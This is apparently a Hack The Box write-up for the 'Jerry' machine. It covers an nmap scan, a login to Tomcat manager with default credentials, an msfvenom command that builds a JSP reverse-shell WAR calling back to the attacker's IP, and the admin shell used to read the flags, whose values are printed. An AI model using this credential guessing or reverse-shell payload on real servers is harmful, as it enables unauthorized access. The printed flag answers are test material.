# Recon
```bash
ashu ㉿kali  ~/HackTheBox  ping jerry.htb          
PING jerry.htb (10.10.10.95) 56(84) bytes of data.
64 bytes from jerry.htb (10.10.10.95): icmp_seq=1 ttl=127 time=127 ms
64 bytes from jerry.htb (10.10.10.95): icmp_seq=2 ttl=127 time=130 ms
^C
--- jerry.htb ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 127.487/128.553/129.620/1.066 ms

```

```bash
ashu ㉿kali  ~/HackTheBox/Jerry  nmap -sC -sV jerry.htb                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 21:12 IST
Nmap scan report for jerry.htb (10.10.10.95)
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.38 seconds

```


Let's Check Port 8080

A apache server is running on this machine.

![[Pasted image 20250226211524.png]]

Here, As we can see the tomcat server isn't configured to I tried Bruteforcing with Default creds

and this was the creds 
username:`tomcat`
password:`s3cret`

![[Pasted image 20250226214942.png]]

After Getting Logged in I Checked HackTricks and Generated a war file

### MSFVenom Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
```

Then, upload the revshell.war file and access to it (_/revshell/_)


here, I hit the directory /revshell  and got the Admin Shell.

```powershell
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>cd ..
cd ..

C:\>cd Users/Administrator/Desktop/flags
cd Users/Administrator/Desktop/flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,830,784 bytes free

C:\Users\Administrator\Desktop\flags>type 2 for the price of 1.txt
type 2 for the price of 1.txt

C:\Users\Administrator\Desktop\flags>2 "2 for the price of 1.txt     
2 "2 for the price of 1.txt

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>


```

Got The User Flags !!